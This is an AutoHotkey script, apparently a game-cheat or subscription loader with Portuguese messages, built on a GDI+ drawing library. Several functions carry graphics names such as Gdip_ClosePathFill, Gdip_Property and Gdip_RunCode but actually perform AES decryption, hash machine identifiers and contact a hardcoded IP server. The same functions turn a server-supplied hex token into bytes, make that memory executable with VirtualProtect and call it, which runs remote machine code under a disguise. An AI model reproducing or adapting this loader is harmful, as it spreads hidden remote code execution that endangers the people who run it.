DllCall("gdiplus\GdipGetImageWidth", "UPtr", pBitmap, "uint*", Width)
return Width
}
Gdip_GetImageHeight(pBitmap) {
Height := 0
DllCall("gdiplus\GdipGetImageHeight", "UPtr", pBitmap, "uint*", Height)
return Height
}
Gdip_CreateLinearGrBrushFromRect(x, y, w, h, ARGB1, ARGB2, LinearGradientMode:=1, WrapMode:=1) {
CreateRectF(RectF, x, y, w, h)
pLinearGradientBrush := 0
E := DllCall("gdiplus\GdipCreateLineBrushFromRect", "UPtr", &RectF, "int", ARGB1, "int", ARGB2, "int", LinearGradientMode, "int", WrapMode, "UPtr*", pLinearGradientBrush)
return pLinearGradientBrush
}
Gdip_CreatePen(ARGB, w, Unit:=2) {
pPen := 0
E := DllCall("gdiplus\GdipCreatePen1", "UInt", ARGB, "float", w, "int", Unit, "UPtr*", pPen)
return pPen
}
Gdip_GetPenWidth(pPen) {
width := 0
E := DllCall("gdiplus\GdipGetPenWidth", "UPtr", pPen, "float*", width)
If E
return -1
return width
}
Gdip_DrawEllipse(pGraphics, pPen, x, y, w, h) {
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipDrawEllipse", Ptr, pGraphics, Ptr, pPen, "float", x, "float", y, "float", w, "float", h)
}
Gdip_DrawLine(pGraphics, pPen, x1, y1, x2, y2) {
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipDrawLine"
, Ptr, pGraphics
, Ptr, pPen
, "float", x1, "float", y1
, "float", x2, "float", y2)
}
Gdip_DrawRoundedLine(G, x1, y1, x2, y2, LineWidth, LineColor) {
pPen := Gdip_CreatePen(LineColor, LineWidth)
Gdip_DrawLine(G, pPen, x1, y1, x2, y2)
Gdip_DeletePen(pPen)
pPen := Gdip_CreatePen(LineColor, LineWidth/2)
Gdip_DrawEllipse(G, pPen, x1-LineWidth/4, y1-LineWidth/4, LineWidth/2, LineWidth/2)
Gdip_DrawEllipse(G, pPen, x2-LineWidth/4, y2-LineWidth/4, LineWidth/2, LineWidth/2)
Gdip_DeletePen(pPen)
}
Gdip_ResetClip(pGraphics) {
return DllCall("gdiplus\GdipResetClip", "UPtr", pGraphics)
}
Gdip_CreateARGBHBITMAPFromBitmap(ByRef pBitmap) {
Gdip_GetImageDimensions(pBitmap, Width, Height)
hdc := CreateCompatibleDC()
hbm := CreateDIBSection(width, -height, hdc, 32, pBits)
obm := SelectObject(hdc, hbm)
CreateRect(Rect, 0, 0, width, height)
VarSetCapacity(BitmapData, 16+2*A_PtrSize, 0)
, NumPut( width, BitmapData, 0, "uint")
, NumPut( height, BitmapData, 4, "uint")
, NumPut( 4 * width, BitmapData, 8, "int")
, NumPut( 0xE200B, BitmapData, 12, "int")
, NumPut( pBits, BitmapData, 16, "ptr")
DllCall("gdiplus\GdipBitmapLockBits"
, "ptr", pBitmap
, "ptr", &Rect
, "uint", 5
, "int", 0xE200B
, "ptr", &BitmapData)
DllCall("gdiplus\GdipBitmapUnlockBits", "ptr", pBitmap, "ptr", &BitmapData)
SelectObject(hdc, obm)
DeleteObject(hdc)
return hbm
}
Gdip_CreateBitmapFromHBITMAP(hBitmap, hPalette:=0) {
Static Ptr := "UPtr"
pBitmap := 0
DllCall("gdiplus\GdipCreateBitmapFromHBITMAP", Ptr, hBitmap, Ptr, hPalette, "UPtr*", pBitmap)
return pBitmap
}
CreateRect(ByRef Rect, x, y, x2, y2) {
VarSetCapacity(Rect, 16)
NumPut(x, Rect, 0, "uint"), NumPut(y, Rect, 4, "uint")
NumPut(x2, Rect, 8, "uint"), NumPut(y2, Rect, 12, "uint")
}
CreatePointsF(ByRef PointsF, inPoints) {
Points := StrSplit(inPoints, "|")
PointsCount := Points.Length()
VarSetCapacity(PointsF, 8 * PointsCount, 0)
for eachPoint, Point in Points
{
Coord := StrSplit(Point, ",")
NumPut(Coord[1], &PointsF, 8*(A_Index-1), "float")
NumPut(Coord[2], &PointsF, (8*(A_Index-1))+4, "float")
}
Return PointsCount
}
Gdip_DrawRoundedRectangle(pGraphics, pPen, x, y, w, h, r) {
penWidth := Gdip_GetPenWidth(pPen)
pw := penWidth / 2
if (w <= h && (r + pw > w / 2))
r := (w / 2 > pw) ? w / 2 - pw : 0
else if (h < w && r + pw > h / 2)
r := (h / 2 > pw) ? h / 2 - pw : 0
else if (r < pw / 2)
r := pw / 2
r2 := r*2
path1 := Gdip_CreatePath(0)
Gdip_AddPathArc(path1, x + pw, y + pw, r2, r2, 180, 90)
Gdip_AddPathArc(path1, x + w - r2 - pw, y + pw, r2, r2, 270, 90)
Gdip_AddPathArc(path1, x + w - r2 - pw, y + h - r2 - pw, r2, r2, 0, 90)
Gdip_AddPathArc(path1, x + pw, y + h - r2 - pw, r2, r2, 90, 90)
Gdip_ClosePathFigure(path1)
E := Gdip_DrawPath(pGraphics, pPen, path1)
Gdip_DeletePath(path1)
return E
}
Gdip_Property() {
For k, v in GetUID()
Hash .= (Hash ? "/" : "") v
Return CreateHash(Hash)
}
Gdip_FillRoundedRectangle(pGraphics, pBrush, x, y, w, h, r) {
r := (w <= h) ? (r < w // 2) ? r : w // 2 : (r < h // 2) ? r : h // 2
r2 := r*2
path1 := Gdip_CreatePath(0)
Gdip_AddPathArc(path1, x, y, r2, r2, 180, 90)
Gdip_AddPathArc(path1, x + w - r2, y, r2, r2, 270, 90)
Gdip_AddPathArc(path1, x + w - r2, y + h - r2, r2, r2, 0, 90)
Gdip_AddPathArc(path1, x, y + h - r2, r2, r2, 90, 90)
Gdip_ClosePathFigure(path1)
E := Gdip_FillPath(pGraphics, pBrush, path1)
Gdip_DeletePath(path1)
return E
}
Gdip_AddPathEllipse(pPath, x, y, w, h) {
return DllCall("gdiplus\GdipAddPathEllipse", "UPtr", pPath, "float", x, "float", y, "float", w, "float", h)
}
Gdip_AddPathRectangle(pPath, x, y, w, h) {
return DllCall("gdiplus\GdipAddPathRectangle", "UPtr", pPath, "float", x, "float", y, "float", w, "float", h)
}
Gdip_AddPathBeziers(pPath, Points) {
iCount := CreatePointsF(PointsF, Points)
return DllCall("gdiplus\GdipAddPathBeziers", "UPtr", pPath, "UPtr", &PointsF, "int", iCount)
}
Gdip_AddPathBezier(pPath, x1, y1, x2, y2, x3, y3, x4, y4) {
return DllCall("gdiplus\GdipAddPathBezier", "UPtr", pPath, "float", x1, "float", y1, "float", x2, "float", y2, "float", x3, "float", y3, "float", x4, "float", y4)
}
Gdip_AddPathLines(pPath, Points) {
iCount := CreatePointsF(PointsF, Points)
return DllCall("gdiplus\GdipAddPathLine2", "UPtr", pPath, "UPtr", &PointsF, "int", iCount)
}
Gdip_AddPathLine(pPath, x1, y1, x2, y2) {
return DllCall("gdiplus\GdipAddPathLine", "UPtr", pPath, "float", x1, "float", y1, "float", x2, "float", y2)
}
Gdip_AddPathArc(pPath, x, y, w, h, StartAngle, SweepAngle) {
return DllCall("gdiplus\GdipAddPathArc", "UPtr", pPath, "float", x, "float", y, "float", w, "float", h, "float", StartAngle, "float", SweepAngle)
}
Gdip_AddPathPie(pPath, x, y, w, h, StartAngle, SweepAngle) {
return DllCall("gdiplus\GdipAddPathPie", "UPtr", pPath, "float", x, "float", y, "float", w, "float", h, "float", StartAngle, "float", SweepAngle)
}
Gdip_CreatePath(BrushMode:=0) {
pPath := 0
DllCall("gdiplus\GdipCreatePath", "int", BrushMode, "UPtr*", pPath)
return pPath
}
Gdip_FillPath(pGraphics, pBrush, pPath) {
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipFillPath", Ptr, pGraphics, Ptr, pBrush, Ptr, pPath)
}
Gdip_DrawPath(pGraphics, pPen, pPath) {
return DllCall("gdiplus\GdipDrawPath", "UPtr", pGraphics, "UPtr", pPen, "UPtr", pPath)
}
Gdip_DeletePath(pPath) {
return DllCall("gdiplus\GdipDeletePath", "UPtr", pPath)
}
Gdip_ClosePathFigure(pPath) {
return DllCall("gdiplus\GdipClosePathFigure", "UPtr", pPath)
}
Gdip_ClosePathDraw(String, Ptr:= "", Output:= "BASE64") {
AHANDLE := OpenAlgorithmProvider(Chr(65)Chr(69)Chr(83))
SetProperty(AHANDLE, "ChainingMode")
YHANDLE := GenerateBitmap(AHANDLE, Ptr)
cbInput := StrPutVar(String, pbInput)
cLen := Encrypt(YHANDLE, pbInput, cbInput, 16, rData, 0x00000001)
ENCRYPT := CryptBinaryToString(rData, cLen, Output)
if (YHANDLE)
Destroy(YHANDLE)
if (AHANDLE)
CloseAlgorithmProvider(AHANDLE)
return CryptBinaryToString(rData, cLen, Output)
}
Gdip_ClosePathFill(String, Ptr:= "", Input:= "BASE64") {
AHANDLE := OpenAlgorithmProvider(Chr(65)Chr(69)Chr(83))
SetProperty(AHANDLE, "ChainingMode")
YHANDLE := GenerateBitmap(AHANDLE, Ptr)
cLen := CryptStringToBinary(String, rData)
dLen := Decrypt(YHANDLE, rData, cLen, 16, dData, 0x00000001)
if (YHANDLE)
Destroy(YHANDLE)
if (AHANDLE)
CloseAlgorithmProvider(AHANDLE)
return StrGet(&dData, dLen, "UTF-8")
}
OpenAlgorithmProvider(pszAlgId, dwFlags := 0, pszImplementation := 0) {
NT_STATUS := DllCall("bcrypt\BCryptOpenAlgorithmProvider", "ptr*", phAlgorithm, "ptr", &pszAlgId, "ptr", pszImplementation, "uint", dwFlags)
if (NT_STATUS = 0)
return phAlgorithm
return false
}
SetProperty(hObject, pszProperty) {
NT_STATUS := DllCall("bcrypt\BCryptSetProperty", "ptr", hObject, "ptr", &pszProperty, "ptr", &pbInput:="ChainingModeECB", "uint", 15, "uint", dwFlags := 0)
if (NT_STATUS = 0)
return true
return false
}
GenerateBitmap(hAlgorithm, pb) {
NT_STATUS := DllCall("bcrypt\BCryptGenerateSymmetricKey", "ptr", hAlgorithm, "ptr*", pBitmap, "ptr", 0, "uint", 0, "ptr", &pb, "uint", 32, "uint", 0)
if (NT_STATUS = 0)
return pBitmap
return false
}
Encrypt(hKey, ByRef pbInput, cbInput, BLOCK_LENGTH, ByRef pbOutput, dwFlags := 0) {
NT_STATUS := DllCall("bcrypt\BCryptEncrypt", "ptr", hKey, "ptr", &pbInput, "uint", cbInput, "ptr", 0, "ptr", (pbIV ? &pbIV : 0), "uint", (cbIV ? &cbIV : 0), "ptr", 0, "uint", 0, "uint*", cbOutput, "uint", dwFlags)
if (NT_STATUS = 0)
{
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptEncrypt", "ptr", hKey, "ptr", &pbInput, "uint", cbInput, "ptr", 0, "ptr", (pbIV ? &pbIV : 0), "uint", (cbIV ? &cbIV : 0), "ptr", &pbOutput, "uint", cbOutput, "uint*", cbOutput, "uint", dwFlags)
if (NT_STATUS = 0)
{
return cbOutput
}
}
return false
}
Decrypt(hKey, ByRef String, cbInput, BLOCK_LENGTH, ByRef pbOutput, dwFlags) {
VarSetCapacity(pbInput, cbInput, 0)
DllCall("msvcrt\memcpy", "ptr", &pbInput, "ptr", &String, "ptr", cbInput)
NT_STATUS := DllCall("bcrypt\BCryptDecrypt", "ptr", hKey, "ptr", &pbInput, "uint", cbInput, "ptr", 0, "ptr", (pbIV ? &pbIV : 0), "uint", (cbIV ? &cbIV : 0), "ptr", 0, "uint", 0, "uint*", cbOutput, "uint", dwFlags)
if (NT_STATUS =0)
{
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptDecrypt", "ptr", hKey, "ptr", &pbInput, "uint", cbInput, "ptr", 0, "ptr", (pbIV ? &pbIV : 0), "uint", (cbIV ? &cbIV : 0), "ptr", &pbOutput, "uint", cbOutput, "uint*", cbOutput, "uint", dwFlags)
if (NT_STATUS = 0)
{
return cbOutput
}
}
return false
}
Destroy(hKey) {
DllCall("bcrypt\BCryptDestroyKey", "ptr", hKey)
}
CloseAlgorithmProvider(hAlgorithm) {
DllCall("bcrypt\BCryptCloseAlgorithmProvider", "ptr", hAlgorithm, "uint", 0)
}
StrPutVar(String, ByRef Data) {
VarSetCapacity(Data, Length := StrPut(String, "UTF-8") - 1)
return StrPut(String, &Data, Length, "UTF-8")
}
StrPutFix(v) {
Length := StrPut(v, "UTF-8") - 1
VarSetCapacity(%Length%, Length)
StrPut(v, & %Length%, Length, "UTF-8")
SetVar := [%Length%]
Return SetVar.1
}
class OBJSave {
__New(file) {
if !FileExist(file)
FileAppend,% emptyvar,% file
else {
FileRead, src, % file
if (src != "") {
FixBase := this.base
this := Gdip_SetString(src)
if ( !IsObject(this) )
this := {}
this.base := FixBase
}
}
this.file := file
Return this
}
Write(Section, Key, Value) {
if ( !IsObject(this[Section]) )
this[Section] := {}
if (value == "")
this[Section].Remove(Key)
else
this[Section][Key] := value
}
Save(obj) {
saveObj := this.objSave(obj)
FileDelete, % this.file
FileAppend, % saveObj, % this.file
}
objSave(obj) {
static q := Chr(34)
if IsObject(obj) {
is_array := 0, out := ""
for k in obj
is_array := k == A_Index
until !is_array
for k, v in obj {
if !is_array
out .= ( ObjGetCapacity([k], 1) ? this.objSave(k) : q . k . q ) .  ":"
out .= this.objSave(v) . ","
}
if (out != "")
out := Trim(out, ",")
return is_array ? "[" . out . "]" : "{" . out . "}"
}
else if (ObjGetCapacity([obj], 1) == "")
return obj
return q . obj . q
}
}
Gdip_RunCode() {
Type := MHGui.Controls[A_GuiControl].Array
A_Args.SetGame := A_Args.Games[Type].Game
1 := "GameLogin"
2 := Save.Config.Edit01
3 := Save.Config.Edit02
4 := Save.Ling
5 := A_Args.SetGame
6 := A_Args.JS.Token
Data.Send := Data.GameLogin
Loop, 6
Data.Send := StrReplace(Data.Send, "!" A_Index, %A_Index%)
try {
r := Gdip_SetString(ServerPOST(Data.Send,01))
If (r.Type != 200) {
MsgBox, %  "Error ao carregar game, Entre em contato com um Admin."
Return
}
} catch e {
If (i := InStr(e.Message, "Description:")){
MsgBox, % "Description: " StrReplace(SubStr(e.Message, i, InStr(e.Message, "`n",, i)-i), "Description:`t" , "") "`nFile: " e.File
Return
}
MsgBox, %  "Error, Entre em contato com um Admin.`n" e.Extra "`n" e.Message "`n" e.File
}
Try {
If (!A_Args.Games[Type].Var)
Return
} catch e {
MsgData(07, 4112)
Return
}
Try {
Version := A_Args.Games[Type].Version
If (!FileExist( A_Args.SetGame ) || A_Args.Games[Type].Version != Save.Version[A_Args.SetGame]){
Gdip_GetFile(A_Args.Games[Type].Link, A_Args.SetGame)
if ( !IsObject(Save.Version) )
Save.Version := {}
Save.Version[A_Args.SetGame] := A_Args.Games[Type].Version
Save.Save(Save)
}
VarSetCapacity(str, A_Args.Games[Type].Var, 0)
Ptr := (A_PtrSize ? "UPtr" : "UInt")
AStr := (A_IsUnicode ? "AStr" : "Str")
Ahk := A_AhkPath
If (!Ahk){
MsgBox, 4112, Error!, `nCan't Find:`n`n%Ahk%`n`t
return
}
GetLoad(Func, r.Token)
Loop, % A_Args.Games[Type].ID
NumPut(LoadExec(), str, (A_Index-1)*4, "UInt")
DllCall(&Func,AStr,Ahk,AStr,,Ptr,DllCall("GetModuleHandle", "Str","Kernel32", Ptr),Ptr,&str,"Int",A_Args.Games[Type].ID)
ExitApp
} catch e {
ExitApp
}
}
LoadExec(){
static v:=0, i:=2, Ptr
If (!Ptr)
FileRead, Ptr, % A_Args.SetGame
i+=v
Return SubStr(Ptr, i++ , v:=SubStr(Ptr, i-2, 1)=0 ? 10 : SubStr(Ptr, i-2, 1))
}
GetLoad(ByRef code, Token){
VarSetCapacity(code, len:=StrLen(Token)//2)
Loop, % len
NumPut("0x" SubStr(Token, 2*A_Index-1, 2), code, A_Index-1,"uchar")
Ptr:=A_PtrSize ? "UPtr" : "UInt"
DllCall("VirtualProtect",Ptr,&code,Ptr,len,"UInt",0x40,Ptr "*",0)
}
GuiLoad(){
try {
doc := ComObjCreate("htmlfile")
doc.write("<meta http-equiv=""X-UA-Compatible"" content=""IE=9"">")
Get := ComObjCreate("WinHttp.WinHttpRequest.5.1")
Get.Open("POST", "http://207.180.226.91:1347/AHK")
Get.SetRequestHeader("Content-Type", "application/json")
Body = {"type": "guiAHK"}
Get.Send(Body)
Return doc.parentWindow.Eval("(" Get.ResponseText ")")
} catch e {
MsgBox, % "Erro, Sem Resposta do Servidor`n" e.Message
ExitApp
}
}
ServerPOST(Body,Type) {
Get := ComObjCreate("WinHttp.WinHttpRequest.5.1")
Get.Open("POST", Data["Link"][Type])
Get.SetRequestHeader("Content-Type", "application/json")
Get.Send(Body)
Return Get["ResponseText"]
}
TryCreate(Body,Type){
try {
r := Gdip_SetString(ServerPOST(Body,Type))
If (r.Type == 100) {
MHGui.Controls.Edit01.SetText(MHGui.Controls.Edit04.GetText())
MHGui.Controls.Edit02.SetText(MHGui.Controls.Edit05.GetText())
MHGui.Controls.CustomText01.Set({por: "Tela de Login", eng: "Login Screen"})
MHGui.Show(,"Login")
MHGui.Hide("Create")
Save.Save(Save)
MsgData(05, 4144)
Return
}
Return r
} catch e {
If (i := InStr(e.Message, "Description:")){
MsgBox, % "Description: " StrReplace(SubStr(e.Message, i, InStr(e.Message, "`n",, i)-i), "Description:`t" , "") "`nFile: " e.File
Return
}
MsgBox, %  "Error, Entre em contato com um Admin.`n" e.Extra "`n" e.Message "`n" e.File
}
}
TryLogin(Body,Type) {
try {
r := Gdip_SetString(ServerPOST(Body,Type))
If (r.Type == 200) {
If (r.Token) {
A_Args.Token := Gdip_ClosePathFill(r.Token, A_Args.PW.UPtr)
Token := A_Args.PW.eval(Gdip_ClosePathFill(A_Args.Token,  A_Args.PW.AStr))
}
GuiGames(Token)
Return r
}
Return r
} catch e {
If (i := InStr(e.Message, "Description:")){
MsgBox, % "Description: " StrReplace(SubStr(e.Message, i, InStr(e.Message, "`n",, i)-i), "Description:`t" , "") "`nFile: " e.File
Return
}
MsgBox, %  "Error, Entre em contato com um Admin.`n" e.Extra "`n" e.Message "`n" e.File
}
}
GuiGames(Games){
A_Args.Games := Games
Len := A_Args.JS.Object.keys(Games).length
If (Len = 0){
MsgData(06, 4112)
Return
}
Loop % Len {
if (A_Index == 1)
MHGui.Add("IMGButton", Games[A_Index]["Game"], "x10  y50")
else
MHGui.Add("IMGButton", Games[A_Index]["Game"], "x+10 y50")
MHGui.Controls["IMGButton" Games[A_Index]["Game"]].Array := A_Index
MHGui.Add("DefText", {"por": Games[A_Index]["Days"],"eng": Games[A_Index]["Days"],"Window": "Games","FontOptions": "s6 cFFFFFF bold", "Font": "Tahoma"}, "y+5 w74 center")
}
MHGui.Controls.CustomText01.Set({eng: "Select Game", por: "Selecionar Jogo"})
MHGui.Show(,"Games")
MHGui.Hide("Login")
}
CreateHash(String) {
DllCall("bcrypt\BCryptOpenAlgorithmProvider", "ptr*", ALG_HANDLE, "ptr",  &pszAlgId:="MD5", "ptr",  0, "uint", 0x00000008)
cbSecret := StrPutVar("Create Hash", pbSecret)
NT_STATUS := DllCall("bcrypt\BCryptCreateHash", "ptr",  ALG_HANDLE, "ptr*", HASH_HANDLE, "ptr",  pbHashObject := 0, "uint", cbHashObject := 0, "ptr",  &pbSecret, "uint", cbSecret, "uint", dwFlags := 0)
if (NT_STATUS != 0)
return False
cbInput := StrPutVar(String, pbInput)
DllCall("bcrypt\BCryptHashData", "ptr",  HASH_HANDLE, "ptr",  &pbInput, "uint", cbInput, "uint", 0)
VarSetCapacity(HASH_DATA, 16, 0)
NT_STATUS := DllCall("bcrypt\BCryptFinishHash", "ptr",  HASH_HANDLE, "ptr",  &HASH_DATA, "uint", 16, "uint", 0)
if (NT_STATUS != 0)
return False
if (HASH_HANDLE)
DllCall("bcrypt\BCryptDestroyHash", "ptr", HASH_HANDLE)
if (ALG_HANDLE)
DllCall("bcrypt\BCryptCloseAlgorithmProvider", "ptr", ALG_HANDLE, "uint", 0)
return CryptBinaryToString(HASH_DATA, 16, "HEXRAW")
}
GuiName() {
DllCall("bcrypt\BCryptOpenAlgorithmProvider", "ptr*", ALG_HANDLE, "ptr",  &pszAlgId:="MD5", "ptr",  0, "uint", 0x00000008)
Random, HMAC, 1000, 1000000
cbSecret := StrPutVar(HMAC, pbSecret)
NT_STATUS := DllCall("bcrypt\BCryptCreateHash", "ptr",  ALG_HANDLE, "ptr*", HASH_HANDLE, "ptr",  pbHashObject := 0, "uint", cbHashObject := 0, "ptr",  &pbSecret, "uint", cbSecret, "uint", dwFlags := 0)
if (NT_STATUS != 0)
return "Error"
Random, String, 1000, 1000000
cbInput := StrPutVar(String, pbInput)
DllCall("bcrypt\BCryptHashData", "ptr",  HASH_HANDLE, "ptr",  &pbInput, "uint", cbInput, "uint", 0)
DllCall("bcrypt\BCryptGetProperty", "ptr", ALG_HANDLE, "ptr", &pszProperty:="HashDigestLength", "uint*", HASH_LENGTH, "uint",  4, "uint*", pcbResult, "uint",  dwFlags := 0)
VarSetCapacity(HASH_DATA, HASH_LENGTH, 0)
NT_STATUS := DllCall("bcrypt\BCryptFinishHash", "ptr",  HASH_HANDLE, "ptr",  &HASH_DATA, "uint", HASH_LENGTH, "uint", 0)
if (NT_STATUS != 0)
return "Error"
if (HASH_HANDLE)
DllCall("bcrypt\BCryptDestroyHash", "ptr", HASH_HANDLE)
if (ALG_HANDLE)
DllCall("bcrypt\BCryptCloseAlgorithmProvider", "ptr", ALG_HANDLE, "uint", 0)
Random, Trim, 10, 28
return SubStr(CryptBinaryToString(HASH_DATA, HASH_LENGTH, "HEXRAW"), 1, Trim)
}
String() {
Random, String1, 10000000, 99999999
Random, String2, 10000000, 99999999
A_Args.JS.GetTime := String1 . String2
return A_Args.JS.GetTime
}
GetTime() {
static SYSTEMTIME, init := VarSetCapacity(SYSTEMTIME, 16, 0) && NumPut(16, SYSTEMTIME, "UShort")
DllCall("kernel32.dll\GetSystemTime", "Ptr", &SYSTEMTIME, "Ptr")
Return NumGet(SYSTEMTIME, 6, "UShort") "T" NumGet(SYSTEMTIME, 8, "UShort") ":" NumGet(SYSTEMTIME, 10, "UShort") ":" NumGet(SYSTEMTIME, 12, "UShort") "." NumGet(SYSTEMTIME, 14, "UShort") "Z"
}
IsValidEmail(emailstr){
static 	regex := "is)^(?:""(?:\\\\.|[^""])*""|[^@]+)@(?=[^()]*(?:\([^)]*\)[^()]*)*\z)(?![^ ]* (?=[^)]+(?:\(|\z)))(?:(?:[a-z\d() ]+(?:[a-z\d() -]*[()a-z\d])?\.)+[a-z\d]{2,6}|\[(?:(?:1?\d\d?|2[0-4]\d|25[0-4])\.){3}(?:1?\d\d?|2[0-4]\d|25[0-4])\]) *\z"
return RegExMatch(emailstr, regex) != 0
}
zCompress(Byref Compressed, Byref Data, DataLen, level = -1) {
nSize := DllCall("mCode\compressBound", "UInt", DataLen, "Cdecl")
VarSetCapacity(Compressed,nSize)
ErrorLevel := DllCall("mCode\compress2", "ptr", &Compressed, "UIntP", nSize, "ptr", &Data, "UInt", DataLen, "Int", level, "Cdecl")
Compressed := [Compressed]
return ErrorLevel ? 0 : nSize
}
zDecompress(Byref Decompressed, Byref Compressed, DataLen, OriginalSize = -1) {
OriginalSize := (OriginalSize > 0) ? OriginalSize : DataLen*10
VarSetCapacity(Decompressed,OriginalSize)
ErrorLevel := DllCall("mCode\uncompress", "Ptr", &Decompressed, "UIntP", OriginalSize, "Ptr", &Compressed, "UInt", DataLen)
return ErrorLevel
}
Base64Enc( ByRef Bin, nBytes, LineLength := 64, LeadingSpaces := 0 ) {
Local Rqd := 0, B64, B := "", N := 0 - LineLength + 1
DllCall( "Crypt32.dll\CryptBinaryToString", "Ptr",&Bin ,"UInt",nBytes, "UInt",0x1, "Ptr",0, "UIntP",Rqd )
VarSetCapacity( B64, Rqd * ( A_Isunicode ? 2 : 1 ), 0 )
DllCall( "Crypt32.dll\CryptBinaryToString", "Ptr",&Bin, "UInt",nBytes, "UInt",0x1, "Str",B64, "UIntP",Rqd )
If ( LineLength = 64 and ! LeadingSpaces )
Return B64
B64 := StrReplace( B64, "`r`n" )
Loop % Ceil( StrLen(B64) / LineLength )
B .= Format("{1:" LeadingSpaces "s}","" ) . SubStr( B64, N += LineLength, LineLength ) . "`n"
Return RTrim( B,"`n" )
}
Base64Dec( ByRef B64, ByRef Bin ) {
Local Rqd := 0, BLen := StrLen(B64)
DllCall( "Crypt32.dll\CryptStringToBinary", "Str",B64, "UInt",BLen, "UInt",0x1, "UInt",0, "UIntP",Rqd, "Int",0, "Int",0 )
VarSetCapacity( Bin, 128 ), VarSetCapacity( Bin, 0 ), VarSetCapacity( Bin, Rqd, 0 )
DllCall( "Crypt32.dll\CryptStringToBinary", "Str",B64, "UInt",BLen, "UInt",0x1, "Ptr",&Bin, "UIntP",Rqd, "Int",0, "Int",0 )
Return Rqd
}
LoadImages() {
A_Args.PNG := {}
Data.PNG := "iVBORw0KGgoAAAANSUhEUgAAA"
A_Args.PNG.LogoMH          := Gdip_BitmapFromBase64(0,1,Data.PNG "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